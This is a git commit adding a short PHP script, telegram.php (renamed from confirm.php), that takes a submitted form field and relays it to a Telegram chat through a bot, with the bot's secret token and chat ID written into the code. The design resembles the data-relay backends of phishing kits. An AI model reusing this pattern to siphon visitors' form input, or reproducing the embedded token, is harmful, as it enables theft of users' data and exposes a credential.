61148b66725e40fa1a7dd3d0def4c0641151aab4
zitizozem2 <zitizozem2@gakew.com>
2024-09-07 22:11:31 +0700

    Update and rename confirm.php to telegram.php

---
+++ telegram.php
@@ -0,0 +1,27 @@
+<?php
+$telegram_id = '6245535196';
+$secret_token = '7285951498:AAFLIxGKudTbK-B3DD4NCN2Q0q--wTy_GHA';
+$message_text = $_POST['nama'];
+
+sendMessage($telegram_id, $message_text, $secret_token);
+
+function sendMessage($telegram_id, $message_text, $secret_token) {
+    $url = "https://api.telegram.org/bot" . $secret_token . "/sendMessage?parse_mode=markdown&chat_id=" . $telegram_id;
+    $url = $url . "&text=" . urlencode($message_text);
+    $ch = curl_init();
+    $optArray = array(
+            CURLOPT_URL => $url,
+            CURLOPT_RETURNTRANSFER => true
+    );
+    curl_setopt_array($ch, $optArray);
+    $result = curl_exec($ch);
+    $err = curl_error($ch);
+    curl_close($ch);
+
+    if ($err) {
+       echo 'Pesan gagal terkirim, error :' . $err;
+    }else{
+        echo 'Pesan terkirim';
+    }
+}
+?>
